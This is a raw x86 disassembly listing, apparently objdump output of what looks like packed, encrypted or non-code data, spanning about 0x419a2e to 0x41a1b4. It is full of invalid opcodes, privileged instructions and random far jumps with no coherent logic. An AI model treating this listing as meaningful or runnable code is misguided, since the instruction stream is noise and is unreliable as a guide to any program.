  419a2e:	fcomp  QWORD PTR [edi]
  419a30:	add    dh,BYTE PTR [edx]
  419a32:	sbb    ecx,DWORD PTR [edi]
  419a34:	dec    edx
  419a35:	jmp    0x33fbe8c
  419a3a:	xor    DWORD PTR [edx-0x57],edx
  419a3d:	jb     0x419a24
  419a3f:	je     0x419a72
  419a41:	mov    al,ds:0x448854c
  419a46:	sub    cl,BYTE PTR [edx-0x78]
  419a49:	sti    
  419a4a:	mov    edi,0x55aae09d
  419a4f:	xor    BYTE PTR [esi],dh
  419a51:	pop    edi
  419a52:	test   eax,0x51b557f5
  419a57:	add    esi,esp
  419a59:	dec    ebp
  419a5a:	imul   ebp,edi,0x4e
  419a5d:	in     al,0x56
  419a5f:	cmp    esi,DWORD PTR ds:[ebx-0x7d0c428c]
  419a66:	add    ebx,DWORD PTR [esi]
  419a68:	mov    ebp,0x7f59c592
  419a6d:	push   ds
  419a6e:	les    edi,FWORD PTR [esp+edi*8+0x6511b652]
  419a75:	xor    al,0x76
  419a77:	jecxz  0x419aac
  419a79:	std    
  419a7a:	xor    esp,ebp
  419a7c:	adc    BYTE PTR [ecx-0x6f],0x72
  419a80:	stc    
  419a81:	bound  ecx,QWORD PTR ds:0x303be071
  419a87:	or     al,0x88
  419a89:	inc    ebp
  419a8a:	hlt    
  419a8b:	cmp    esi,DWORD PTR [eax-0x59d46b1d]
  419a91:	mov    bl,0x3
  419a93:	imul   edx,DWORD PTR [ecx+0x57d325f0],0xffffff82
  419a9a:	jae    0x419a60
  419a9c:	(bad)  
  419a9d:	mov    eax,ds:0xef350b25
  419aa2:	leave  
  419aa3:	cli    
  419aa4:	push   esp
  419aa5:	dec    ecx
  419aa6:	adc    cl,BYTE PTR ds:0xbd80d45f
  419aac:	(bad)  
  419aad:	mov    dl,0x46
  419aaf:	xchg   edi,eax
  419ab0:	ja     0x419b13
  419ab2:	mov    dh,0xdb
  419ab4:	popf   
  419ab5:	push   ebx
  419ab6:	add    BYTE PTR [esi+0xdcd33d5],ah
  419abc:	out    0x61,eax
  419abe:	jnp    0x419abc
  419ac0:	loopne 0x419af6
  419ac2:	mov    eax,ds:0xb68a0596
  419ac7:	inc    ebx
  419ac8:	xor    edi,eax
  419aca:	rcr    BYTE PTR [ebx+0x76],cl
  419acd:	pusha  
  419ace:	outs   dx,BYTE PTR ds:[esi]
  419acf:	icebp  
  419ad0:	push   0x37
  419ad2:	clc    
  419ad3:	mov    ah,0x23
  419ad5:	sbb    DWORD PTR [edi+0x49],edx
  419ad8:	xchg   ebp,eax
  419ad9:	mov    ch,0xe3
  419adb:	adc    eax,0x7414020
  419ae0:	xchg   edx,eax
  419ae1:	dec    ebx
  419ae2:	sbb    ah,bl
  419ae4:	jns    0x419a9a
  419ae6:	cmp    ah,BYTE PTR [edi-0x5762e8a7]
  419aec:	sbb    al,0xb7
  419aee:	pop    edi
  419aef:	sbb    eax,0xf0bb7d7f
  419af4:	loope  0x419ab7
  419af6:	out    0xb2,al
  419af8:	aaa    
  419af9:	pushf  
  419afa:	mov    edx,0x4e78b7b7
  419aff:	mov    eax,ds:0x70d3752e
  419b04:	retf   
  419b05:	fild   DWORD PTR [ebx+0x46]
  419b08:	jnp    0x419ad6
  419b0a:	(bad)
  419b0d:	mov    bh,0xaf
  419b0f:	sub    bh,dh
  419b11:	dec    esp
  419b12:	fwait
  419b13:	hlt    
  419b14:	jo     0x419b6c
  419b16:	dec    ecx
  419b17:	jmp    0x419b82
  419b19:	icebp  
  419b1a:	icebp  
  419b1b:	cmp    al,0x8b
  419b1d:	xor    ecx,DWORD PTR ds:0x3d487d15
  419b23:	sbb    BYTE PTR [edi+edi*8-0x53e5085],cl
  419b2a:	add    eax,0xd744664f
  419b2f:	jbe    0x419b3b
  419b31:	pop    ds
  419b32:	not    BYTE PTR [edx+0x1c]
  419b35:	mov    ch,0xdc
  419b37:	shl    dl,0xad
  419b3a:	stos   BYTE PTR es:[edi],al
  419b3b:	stc    
  419b3c:	mov    ah,0x3b
  419b3e:	aas    
  419b3f:	xchg   DWORD PTR [ebx],esp
  419b41:	inc    ebp
  419b42:	cmp    al,0x4
  419b44:	cmc    
  419b45:	ret    0x9215
  419b48:	and    eax,0x478b9d5a
  419b4d:	test   eax,edx
  419b4f:	lods   eax,DWORD PTR ds:[esi]
  419b50:	inc    edx
  419b51:	imul   esi,DWORD PTR [edx],0x7f
  419b54:	jmp    0xaedafcfb
  419b59:	ror    DWORD PTR [ebp-0x5f],cl
  419b5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b5d:	js     0x419b73
  419b5f:	lods   al,BYTE PTR ds:[esi]
  419b60:	loopne 0x419bab
  419b62:	pusha  
  419b63:	ret    0xa929
  419b66:	jns    0x419b3d
  419b68:	and    dl,BYTE PTR [ebp-0x37]
  419b6b:	imul   ebx,esi,0xffffffaf
  419b6e:	xchg   ebp,eax
  419b6f:	or     BYTE PTR [ebp-0x70],bl
  419b72:	lds    eax,FWORD PTR [ebx]
  419b74:	mov    ds:0x4a53ff0a,eax
  419b79:	fcom   DWORD PTR [edi]
  419b7b:	mov    esp,0xeaa76a97
  419b80:	leave  
  419b81:	into   
  419b82:	cmp    eax,0xe9162ce2
  419b87:	dec    edx
  419b88:	cli    
  419b89:	pop    ds
  419b8a:	inc    edx
  419b8b:	xor    BYTE PTR [ebx],0x2a
  419b8e:	sahf   
  419b8f:	or     edx,DWORD PTR [ebx+0x43eca8d5]
  419b95:	jb     0x419bfb
  419b97:	or     ax,0x3383
  419b9b:	fst    QWORD PTR [edi]
  419b9d:	(bad)  
  419b9e:	fst    st(2)
  419ba0:	les    edi,FWORD PTR [edx]
  419ba2:	addr16 jne 0x419bf7
  419ba5:	call   0x5937:0x3666fc00
  419bac:	cld    
  419bad:	pop    edx
  419bae:	xchg   esp,eax
  419baf:	icebp  
  419bb0:	xchg   ebp,eax
  419bb1:	add    DWORD PTR es:0x753bf0a6,esp
  419bb8:	shl    BYTE PTR [ebp+eax*1+0x571f75a8],1
  419bbf:	stc    
  419bc0:	xchg   ebp,eax
  419bc1:	xchg   BYTE PTR [eax+0x32],ah
  419bc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419bc5:	xchg   ebx,eax
  419bc6:	xchg   edi,eax
  419bc7:	mov    al,0xa8
  419bc9:	in     al,dx
  419bca:	add    ebx,DWORD PTR [esi+0xbba9fe4]
  419bd0:	jo     0x419c3a
  419bd2:	scas   al,BYTE PTR es:[edi]
  419bd3:	cmp    DWORD PTR [ebp-0x1a],esi
  419bd6:	leave  
  419bd7:	jb     0x419c4a
  419bd9:	shl    BYTE PTR [ebp-0xb],1
  419bdc:	(bad)  
  419bdd:	imul   esp,edx,0xcaa6ef18
  419be3:	push   eax
  419be4:	(bad)  
  419be5:	mov    bl,0x85
  419be7:	pop    esi
  419be8:	stos   DWORD PTR es:[edi],eax
  419be9:	xchg   ebx,eax
  419bea:	imul   ecx,DWORD PTR [esi+0x0],0x7037a0e5
  419bf1:	je     0x419bdd
  419bf3:	pop    ds
  419bf4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419bf5:	cld    
  419bf6:	arpl   WORD PTR [edi+0x4e620068],bx
  419bfc:	loop   0x419be1
  419bfe:	dec    eax
  419bff:	cs and eax,0x89741c6b
  419c05:	mov    bl,0x14
  419c07:	pop    edx
  419c08:	das    
  419c09:	sar    DWORD PTR [edi-0x54],cl
  419c0c:	or     edi,0x62
  419c0f:	std    
  419c10:	cs repnz xchg ebp,eax
  419c13:	lock fmul QWORD PTR [ecx]
  419c16:	stos   DWORD PTR es:[edi],eax
  419c17:	sub    DWORD PTR ds:0xea411083,esi
  419c1d:	mov    ah,0x9f
  419c1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c20:	pushf  
  419c21:	xchg   eax,edx
  419c23:	out    0xd1,al
  419c25:	aad    0xf6
  419c27:	loope  0x419c28
  419c29:	push   edi
  419c2a:	(bad)  
  419c2b:	sub    cl,BYTE PTR [esi+edx*8-0x7a]
  419c2f:	pusha  
  419c30:	xchg   edx,eax
  419c31:	fidivr WORD PTR [eax-0x80]
  419c34:	or     BYTE PTR [edx-0x68b52fec],dh
  419c3a:	push   esi
  419c3b:	repnz bound ebx,QWORD PTR [ebx]
  419c3e:	retf   
  419c3f:	jge    0x419c36
  419c41:	jle    0x419c6a
  419c43:	mov    esp,0xbdacb244
  419c48:	sub    ebp,0xffffffc3
  419c4b:	xor    DWORD PTR fs:[bx+di],edi
  419c4f:	das    
  419c50:	pop    ebx
  419c51:	and    ebx,esp
  419c53:	add    esi,DWORD PTR [ebx-0x22357f92]
  419c59:	mov    esi,es
  419c5b:	scas   eax,DWORD PTR es:[edi]
  419c5c:	fisubr DWORD PTR [edx+0x7c22ba1]
  419c62:	in     al,dx
  419c63:	jecxz  0x419c53
  419c65:	sar    bl,1
  419c67:	xchg   edi,eax
  419c68:	xor    BYTE PTR [ebx+0x5615c238],ah
  419c6e:	mov    esi,0xe8dab297
  419c73:	lods   eax,DWORD PTR ds:[esi]
  419c74:	mov    dh,0x91
  419c76:	loopne 0x419c76
  419c78:	sahf   
  419c79:	ss inc edi
  419c7b:	ror    BYTE PTR [eax],0x6d
  419c7e:	mov    dh,0x33
  419c80:	fisub  WORD PTR [edx-0x127f112e]
  419c86:	ins    DWORD PTR es:[edi],dx
  419c87:	mov    dl,0x8
  419c89:	sbb    ch,BYTE PTR [edx]
  419c8b:	lods   eax,DWORD PTR ds:[esi]
  419c8c:	mov    ecx,0xdc74c28c
  419c91:	mov    esi,0x75fd5e8a
  419c96:	or     edx,DWORD PTR [ebp+ebp*8-0x59]
  419c9a:	cmp    DWORD PTR [ecx+0x67f1d4e4],ebx
  419ca0:	mov    esp,0x9d988359
  419ca5:	mov    bl,0xbc
  419ca7:	sbb    BYTE PTR [ecx],0x8a
  419caa:	loop   0x419cef
  419cac:	adc    esi,DWORD PTR [edi-0x1aec700a]
  419cb2:	(bad)  
  419cb3:	push   edx
  419cb4:	xlat   BYTE PTR ds:[ebx]
  419cb5:	fdivrp st(7),st
  419cb7:	mov    ah,0x10
  419cb9:	scas   eax,DWORD PTR es:[edi]
  419cba:	gs pop ecx
  419cbc:	retf   
  419cbd:	xchg   ecx,eax
  419cbe:	test   dl,bl
  419cc0:	imul   ebx,DWORD PTR [edx],0x5ddb1d19
  419cc6:	test   DWORD PTR [esi],edx
  419cc8:	inc    edx
  419cc9:	test   BYTE PTR [ecx],al
  419ccb:	push   eax
  419ccc:	mov    cr0,ecx
  419ccf:	dec    eax
  419cd0:	and    ah,dl
  419cd2:	adc    BYTE PTR [ebp+0x13],ch
  419cd5:	call   0x5e75:0xb245d2c0
  419cdc:	(bad)  
  419cde:	mov    bl,0x8a
  419ce0:	push   0x908d931c
  419ce5:	adc    eax,eax
  419ce7:	mov    ch,BYTE PTR [edx]
  419ce9:	fbld   TBYTE PTR [ecx-0x4a]
  419cec:	sub    eax,0xa4af1a38
  419cf1:	ret    0x912b
  419cf4:	sub    DWORD PTR [ebx+0x28e9ae75],0x2a
  419cfb:	adc    dl,BYTE PTR [edi]
  419cfd:	fild   WORD PTR [esi-0x5b789ba6]
  419d03:	clc    
  419d04:	push   0xfffffffa
  419d06:	mov    edi,0x582d4054
  419d0b:	jmp    0x400b5bf4
  419d10:	push   ecx
  419d11:	outs   dx,BYTE PTR ds:[esi]
  419d12:	ja     0x419cd2
  419d14:	mov    ecx,0x9917c0d8
  419d19:	push   eax
  419d1a:	(bad)  
  419d1b:	(bad)  [ebx-0x7542df5d]
  419d21:	mov    ds:0x592faabd,al
  419d26:	cs push ss
  419d28:	add    eax,0x649dd486
  419d2d:	scas   al,BYTE PTR es:[edi]
  419d2e:	sbb    BYTE PTR [ecx+0xa],0xa3
  419d32:	mov    edi,0x8d37aadf
  419d37:	adc    DWORD PTR [esi+0x2947b025],esp
  419d3d:	mov    esi,0xa3b27b55
  419d42:	in     al,0xda
  419d44:	mov    ecx,0x7f1ef959
  419d49:	fisub  WORD PTR [esp+ebx*8+0x14]
  419d4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d4e:	push   ebx
  419d4f:	xchg   ebp,eax
  419d50:	ds mov bh,0x4
  419d53:	mov    ds:0xe0243a17,al
  419d58:	pop    ss
  419d59:	pop    ds
  419d5a:	xor    eax,0x6235b212
  419d5f:	or     al,BYTE PTR [edi+edx*1]
  419d62:	cmp    eax,esi
  419d64:	sbb    al,0xc2
  419d66:	push   ecx
  419d67:	dec    edi
  419d68:	sti    
  419d69:	in     al,0x13
  419d6b:	popa   
  419d6c:	sbb    eax,0x85ad2e9
  419d71:	cmp    DWORD PTR [edx],eax
  419d73:	dec    ecx
  419d74:	jo     0x419d22
  419d76:	and    edx,esi
  419d78:	mov    edx,0x47fed300
  419d7d:	test   DWORD PTR [ecx],0x349a3d90
  419d83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d84:	push   ebx
  419d85:	lods   al,BYTE PTR ds:[esi]
  419d86:	out    0x65,al
  419d88:	mov    cl,0xbc
  419d8a:	mov    ebx,0xeed3860
  419d8f:	inc    edi
  419d90:	retf   0x3d2b
  419d93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d94:	xchg   ecx,eax
  419d95:	rol    DWORD PTR cs:[eax],cl
  419d98:	jecxz  0x419d68
  419d9a:	jmp    0x419e10
  419d9c:	into   
  419d9d:	or     esp,DWORD PTR [esi-0x60]
  419da0:	mov    edi,0x7f99fabb
  419da5:	(bad)  [eax]
  419da7:	ss push 0xffd0fbc6
  419dad:	ins    BYTE PTR es:[edi],dx
  419dae:	and    edx,DWORD PTR [edx+0x7]
  419db1:	int3   
  419db2:	out    0xbc,eax
  419db4:	push   es
  419db5:	lock add ch,BYTE PTR [esi+0x26]
  419db9:	jmp    0x2e71:0xc08abb7c
  419dc0:	pop    ds
  419dc1:	daa    
  419dc2:	(bad)
  419dc6:	mov    ebx,cs
  419dc8:	rcl    BYTE PTR [edx],1
  419dca:	dec    edx
  419dcb:	mov    al,0x41
  419dcd:	and    al,0x8c
  419dcf:	mov    gs,WORD PTR [esi+ebp*8+0x49671e55]
  419dd6:	mov    ds:0x4f2e3e70,al
  419ddb:	xor    edx,DWORD PTR [ebx+eiz*1-0x7f8ff3e5]
  419de2:	in     al,0x2c
  419de4:	rcr    esi,0xce
  419de7:	adc    eax,0x595c75dd
  419dec:	xchg   edi,eax
  419ded:	push   ebx
  419dee:	dec    esi
  419def:	pop    ecx
  419df0:	(bad)
  419df3:	jmp    0x962f8f2c
  419df8:	sub    bl,BYTE PTR [ebx]
  419dfa:	jne    0x419e6e
  419dfc:	cli    
  419dfd:	(bad)  
  419dfe:	loop   0x419da6
  419e00:	shl    DWORD PTR [esi+0x3c],0x9c
  419e04:	outs   dx,DWORD PTR ds:[esi]
  419e05:	outs   dx,DWORD PTR ds:[esi]
  419e06:	pop    edx
  419e07:	test   eax,0xc0123e01
  419e0c:	pushf  
  419e0d:	mov    edx,0x3e28ee8b
  419e12:	jg     0x419db6
  419e14:	or     al,0x4a
  419e16:	cmp    BYTE PTR [ebp-0x53],ah
  419e19:	jp     0x419e19
  419e1b:	dec    edx
  419e1c:	or     eax,0x565c2e1c
  419e21:	ss push edi
  419e23:	std    
  419e24:	ror    BYTE PTR [esi],cl
  419e26:	lds    eax,FWORD PTR ds:0x615aeb14
  419e2c:	mov    al,0x9
  419e2e:	dec    eax
  419e30:	mov    ah,0xd5
  419e32:	rcr    BYTE PTR [edi-0x49336b12],cl
  419e38:	or     eax,0x5a28aa30
  419e3d:	enter  0x64b2,0xc1
  419e41:	sar    BYTE PTR [eax+ebx*2],cl
  419e44:	(bad)  
  419e45:	sahf   
  419e46:	daa    
  419e47:	popa   
  419e48:	out    0x77,eax
  419e4a:	push   ebp
  419e4b:	sub    BYTE PTR [esi],dl
  419e4d:	cld    
  419e4e:	loop   0x419df9
  419e50:	inc    ebx
  419e51:	fisttp WORD PTR [ebp+0x6de072d9]
  419e57:	push   es
  419e58:	inc    esp
  419e59:	rcr    BYTE PTR [esi+0x4e],cl
  419e5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e5d:	inc    eax
  419e5e:	enter  0x9570,0xba
  419e62:	xchg   edx,eax
  419e63:	push   ds
  419e64:	stc    
  419e65:	xchg   esp,eax
  419e66:	ror    ebx,1
  419e68:	sbb    DWORD PTR [esi],0x601c51cb
  419e6e:	mov    al,ds:0xdf4c1ee5
  419e73:	jo     0x419ed8
  419e75:	imul   eax,edi,0x21
  419e78:	hlt    
  419e79:	ins    BYTE PTR es:[edi],dx
  419e7a:	int    0x1f
  419e7c:	inc    edi
  419e7d:	jno    0x419e45
  419e7f:	clc    
  419e80:	retf   0xcb12
  419e83:	push   esp
  419e84:	cli    
  419e85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e86:	fwait
  419e87:	pop    ss
  419e88:	mov    al,ds:0xee77700c
  419e8d:	repnz xor BYTE PTR [edi-0x64cb295b],dh
  419e94:	push   esp
  419e95:	push   es
  419e96:	sahf   
  419e97:	xchg   esi,eax
  419e98:	jmp    DWORD PTR ds:0xa93beb18
  419e9e:	mov    ebp,0x7989bdc4
  419ea3:	scas   al,BYTE PTR es:[edi]
  419ea4:	daa    
  419ea5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ea6:	mov    ds:0x9a9cc29b,al
  419eab:	adc    al,dh
  419ead:	add    dh,BYTE PTR [edx-0x6]
  419eb0:	add    BYTE PTR [ecx],ah
  419eb2:	popf   
  419eb3:	mov    ds:0x358836b7,eax
  419eb8:	bound  eax,QWORD PTR cs:[esi+0x29]
  419ebc:	or     al,0x90
  419ebe:	bound  ecx,QWORD PTR [esi+0x2b]
  419ec1:	or     dl,BYTE PTR [ecx]
  419ec3:	add    DWORD PTR [edx],ebx
  419ec5:	(bad)  [ecx+0x2f]
  419ec8:	sbb    edi,edx
  419eca:	fcomp  QWORD PTR [ebp-0x3f6a99d5]
  419ed0:	inc    esp
  419ed1:	dec    edi
  419ed2:	mov    ebx,0x70ee6648
  419ed7:	test   DWORD PTR [ebx+0x61370af3],0xc4a9991d
  419ee1:	xor    ecx,DWORD PTR [edi+ecx*4]
  419ee4:	xchg   edi,eax
  419ee5:	xlat   BYTE PTR ds:[ebx]
  419ee6:	fistp  QWORD PTR [esi+0x4cba123f]
  419eec:	loop   0x419f2f
  419eee:	repz inc ecx
  419ef0:	xchg   ebp,eax
  419ef1:	addr16 mov esi,0x378ede24
  419ef7:	cmp    cl,BYTE PTR [esi]
  419ef9:	es popa 
  419efb:	popa   
  419efc:	inc    esi
  419efd:	xchg   ebp,eax
  419efe:	(bad)  
  419f00:	mov    ds:0xde64964c,eax
  419f05:	mov    edx,DWORD PTR ds:[eax+0x7e]
  419f09:	popf   
  419f0a:	push   ecx
  419f0b:	sbb    eax,0xf5a2ac80
  419f10:	test   BYTE PTR [bx+0x7a94],cl
  419f15:	xchg   ebp,eax
  419f16:	mov    ds:0xde85e811,al
  419f1b:	shl    dh,1
  419f1d:	adc    dl,0x8b
  419f20:	jno    0x419f75
  419f22:	xchg   ebx,eax
  419f23:	aad    0xdd
  419f25:	fsubr  DWORD PTR [ecx+0x2f4af540]
  419f2b:	in     eax,0x92
  419f2d:	cmp    al,0xf4
  419f2f:	pop    ebp
  419f30:	stos   DWORD PTR es:[edi],eax
  419f31:	test   DWORD PTR [ecx+0x58],edi
  419f34:	pop    ebp
  419f35:	lods   eax,DWORD PTR ds:[esi]
  419f36:	jns    0x419fb2
  419f38:	loop   0x419f75
  419f3a:	dec    ebx
  419f3b:	pop    ecx
  419f3c:	fist   DWORD PTR [esi]
  419f3e:	push   0x32
  419f40:	mov    DWORD PTR [esi-0x79ca6db7],edi
  419f46:	mov    DWORD PTR [eax],ecx
  419f48:	and    al,0xbb
  419f4a:	inc    ebx
  419f4b:	rcl    BYTE PTR [esi],0x52
  419f4e:	ret    0x2677
  419f51:	js     0x419f4d
  419f53:	jle    0x419f05
  419f55:	int3   
  419f56:	ror    esp,0x15
  419f59:	loopne 0x419fd5
  419f5b:	in     eax,dx
  419f5c:	adc    cl,bl
  419f5e:	dec    eax
  419f5f:	pop    ax
  419f61:	mov    dh,0xc3
  419f63:	dec    ebp
  419f64:	ror    ch,cl
  419f66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f67:	and    dh,BYTE PTR [ecx]
  419f69:	pop    ebp
  419f6a:	xor    BYTE PTR [eax-0x5c935c6d],ah
  419f70:	retf   0xd1e3
  419f73:	or     eax,0xbd918b1b
  419f78:	sbb    DWORD PTR [ebp-0x1dea3b01],ecx
  419f7e:	and    ecx,esi
  419f80:	aam    0xf
  419f82:	aas    
  419f83:	mov    WORD PTR [edx],?
  419f85:	sar    edx,0x1f
  419f88:	or     BYTE PTR [eax],dl
  419f8a:	xor    cl,BYTE PTR [ebx]
  419f8c:	pop    esi
  419f8d:	outs   dx,DWORD PTR ds:[esi]
  419f8e:	inc    edx
  419f8f:	jge    0x419f40
  419f91:	popf   
  419f92:	mov    al,ds:0xcdc95716
  419f97:	ins    BYTE PTR es:[edi],dx
  419f98:	bound  esi,QWORD PTR [eax+0x2d]
  419f9b:	cdq    
  419f9c:	push   edx
  419f9d:	inc    esp
  419f9e:	mov    dl,0x79
  419fa0:	push   edi
  419fa1:	adc    edi,0xffffffbf
  419fa4:	cdq    
  419fa5:	test   DWORD PTR [edi],0x20d8a96b
  419fab:	ret    0x30c9
  419fae:	xor    esp,DWORD PTR [ebx+0x34]
  419fb1:	in     eax,dx
  419fb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419fb3:	cli    
  419fb4:	lods   eax,DWORD PTR ds:[esi]
  419fb5:	adc    DWORD PTR [edi],eax
  419fb7:	dec    eax
  419fb8:	push   ss
  419fb9:	mov    eax,0x6f511b79
  419fbe:	test   BYTE PTR [ebp-0x6a055ffb],ah
  419fc4:	popf   
  419fc5:	dec    ecx
  419fc6:	jecxz  0x419f69
  419fc8:	xchg   esi,eax
  419fc9:	or     esi,edi
  419fcb:	mov    ebp,DWORD PTR [ebx+0x35]
  419fce:	pop    ds
  419fcf:	cmp    BYTE PTR [ecx],bh
  419fd1:	mov    ds:0xa1815aeb,eax
  419fd6:	fadd   DWORD PTR [eax+0x7cc312db]
  419fdc:	cwde   
  419fdd:	in     eax,0x16
  419fdf:	add    al,0xa
  419fe1:	inc    edi
  419fe2:	push   ebx
  419fe3:	pop    eax
  419fe4:	push   ecx
  419fe5:	bnd jne 0x419fe2
  419fe8:	xchg   esp,eax
  419fe9:	sbb    eax,0xe331f83d
  419fee:	pop    ebp
  419fef:	(bad)  
  419ff0:	rcl    BYTE PTR [eax],cl
  419ff2:	inc    esp
  419ff3:	test   eax,0xa6f33d91
  419ff8:	mov    BYTE PTR [edx-0xe],cl
  419ffb:	in     eax,0x42
  419ffd:	test   al,cl
  419fff:	outs   dx,DWORD PTR ds:[esi]
  41a000:	nop
  41a001:	jmp    0xc2b8:0xaf5b889
  41a008:	loopne 0x41a05e
  41a00a:	cs push esp
  41a00c:	pop    ebp
  41a00d:	inc    eax
  41a00e:	shl    DWORD PTR [eax+0x5bcfd01a],cl
  41a014:	es add eax,0x3b70ebb
  41a01a:	mov    eax,DWORD PTR [ebx+0x7674b6d9]
  41a020:	daa    
  41a021:	popf   
  41a022:	fmul   QWORD PTR [eax]
  41a024:	out    0xb4,eax
  41a026:	gs lahf 
  41a028:	and    eax,0xb36f2678
  41a02d:	xor    ebx,esi
  41a02f:	icebp  
  41a030:	mov    al,ds:0x96211023
  41a035:	jmp    0x419ffe
  41a037:	dec    DWORD PTR [ebx+esi*4]
  41a03a:	mov    bh,0xa2
  41a03c:	adc    al,0x56
  41a03e:	jmp    0x5de2:0x6c601bb7
  41a045:	(bad)  
  41a046:	mov    edi,0xd6706112
  41a04b:	sub    eax,DWORD PTR [esi+ebp*1+0x2]
  41a04f:	and    al,0x45
  41a051:	lods   eax,DWORD PTR ds:[esi]
  41a052:	sbb    al,0x56
  41a054:	fwait
  41a055:	rcr    BYTE PTR [esi+0x3be21ddc],cl
  41a05b:	adc    bh,ah
  41a05d:	(bad)  
  41a05e:	out    dx,eax
  41a05f:	and    BYTE PTR [ebp+0x5aa2f1a6],cl
  41a065:	das    
  41a066:	inc    eax
  41a067:	fistp  WORD PTR [ecx+0x307333fc]
  41a06d:	push   edx
  41a06e:	lods   al,BYTE PTR ds:[esi]
  41a06f:	mov    esp,0x40d6ecf1
  41a074:	xor    BYTE PTR [esi-0x5f5368a4],cl
  41a07a:	add    DWORD PTR [edx-0x73],edi
  41a07d:	pop    eax
  41a07e:	cmp    eax,0x5deb912e
  41a083:	repz push 0xe33656b
  41a089:	jecxz  0x41a043
  41a08b:	and    cl,BYTE PTR [ebx-0x1c13e9c1]
  41a091:	icebp  
  41a092:	clc    
  41a093:	jge    0x41a079
  41a095:	sbb    eax,DWORD PTR [eax]
  41a097:	jp     0x41a048
  41a099:	dec    DWORD PTR [edi]
  41a09b:	or     eax,DWORD PTR [edx]
  41a09d:	dec    edx
  41a09e:	push   ebp
  41a09f:	fmulp  st(7),st
  41a0a1:	arpl   WORD PTR [esi],sp
  41a0a3:	in     eax,0x61
  41a0a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a0a6:	(bad)
  41a0aa:	in     al,0x69
  41a0ac:	pop    ss
  41a0ad:	mov    ecx,0x1484e0f4
  41a0b2:	test   eax,0xa5602f55
  41a0b7:	js     0x41a11d
  41a0b9:	add    DWORD PTR [edx+0x53ec0205],ebp
  41a0bf:	fwait
  41a0c0:	inc    esi
  41a0c1:	aad    0x75
  41a0c3:	pop    ds
  41a0c4:	retf   0xb18a
  41a0c7:	aas    
  41a0c8:	outs   dx,DWORD PTR ds:[esi]
  41a0c9:	nop
  41a0ca:	sbb    eax,0xfb4d3027
  41a0cf:	pop    edx
  41a0d0:	mov    ecx,DWORD PTR [ebx]
  41a0d2:	imul   edx,ebp,0x79f77b2f
  41a0d8:	sub    al,0xd0
  41a0da:	call   0xb60c391e
  41a0df:	scas   eax,DWORD PTR es:[edi]
  41a0e0:	pop    ss
  41a0e1:	adc    DWORD PTR [eax+0x78],eax
  41a0e4:	jo     0x41a0f7
  41a0e6:	sbb    dl,dh
  41a0e8:	test   al,0x37
  41a0ea:	scas   eax,DWORD PTR es:[edi]
  41a0eb:	jle    0x41a081
  41a0ed:	xor    BYTE PTR [esp+ebx*4],bh
  41a0f0:	dec    edx
  41a0f1:	xchg   edx,eax
  41a0f2:	jo     0x41a130
  41a0f4:	mov    ebx,0xd7e2f2af
  41a0f9:	sub    bh,bl
  41a0fb:	xchg   esp,eax
  41a0fc:	inc    esp
  41a0fd:	lds    esi,FWORD PTR [edi-0x72]
  41a100:	shl    edi,1
  41a102:	popf   
  41a103:	inc    edx
  41a104:	add    eax,0xc7d4dbe6
  41a109:	jp     0x41a158
  41a10b:	push   eax
  41a10c:	xchg   ebp,eax
  41a10d:	pushf  
  41a10e:	pop    eax
  41a10f:	mov    ecx,0xd654af27
  41a114:	jo     0x41a0a6
  41a116:	dec    esi
  41a117:	call   0x74df7f3d
  41a11c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a11d:	adc    BYTE PTR [ebp+0x60df8155],0xf4
  41a124:	lds    esp,FWORD PTR [ebx]
  41a126:	inc    edx
  41a127:	in     eax,dx
  41a128:	sbb    DWORD PTR [esi-0x2d55ea2a],ecx
  41a12e:	push   ebp
  41a12f:	adc    BYTE PTR [esi+0xcf93986],bl
  41a135:	fcmovu st,st(4)
  41a137:	test   ebx,ebx
  41a139:	fldcw  WORD PTR [ecx+0x7efae10c]
  41a13f:	sar    DWORD PTR [ebx-0x65],cl
  41a142:	and    BYTE PTR [edi-0x73],ah
  41a145:	nop    ecx
  41a148:	mov    eax,0x5adce2ce
  41a14d:	mov    cl,0x84
  41a14f:	jns    0x41a173
  41a151:	inc    edi
  41a152:	stos   BYTE PTR es:[edi],al
  41a153:	(bad)  
  41a154:	sbb    dl,BYTE PTR [ebx]
  41a156:	xor    BYTE PTR [esi+0x5af97966],bl
  41a15c:	sub    BYTE PTR [ebx],cl
  41a15e:	in     eax,dx
  41a15f:	bound  esi,QWORD PTR [ecx+0x1c2ea9e5]
  41a165:	sti    
  41a166:	or     BYTE PTR ds:0xd5111312,dl
  41a16c:	dec    ebx
  41a16d:	in     al,dx
  41a16e:	repz jle 0x41a183
  41a171:	mov    ebx,0xf53f4c18
  41a176:	ja     0x41a15b
  41a178:	arpl   WORD PTR [eax],cx
  41a17a:	xchg   ebx,eax
  41a17b:	xchg   esp,eax
  41a17c:	jmp    0x41a1cb
  41a17e:	repnz add BYTE PTR [esi],dh
  41a181:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a182:	push   ecx
  41a183:	mov    cl,0x34
  41a185:	sbb    al,0x9e
  41a187:	mov    WORD PTR [edx-0x7c7baeb4],fs
  41a18d:	inc    esi
  41a18e:	in     eax,0xe6
  41a190:	sub    eax,0x48ca246f
  41a195:	repz repz out dx,eax
  41a198:	sub    DWORD PTR [esi-0x67],eax
  41a19b:	fdivr  QWORD PTR [esi+0x48]
  41a19e:	cdq    
  41a19f:	mov    bh,0xd4
  41a1a1:	iret   
  41a1a2:	mov    ecx,0x6c03bf72
  41a1a7:	mov    ds:0x88ff6fbf,eax
  41a1ac:	xchg   edx,eax
  41a1ad:	xchg   ebp,eax
  41a1ae:	retf   0x273f
  41a1b1:	inc    ebx
  41a1b2:	sbb    al,0x41
  41a1b4:	ja     0x41a20c
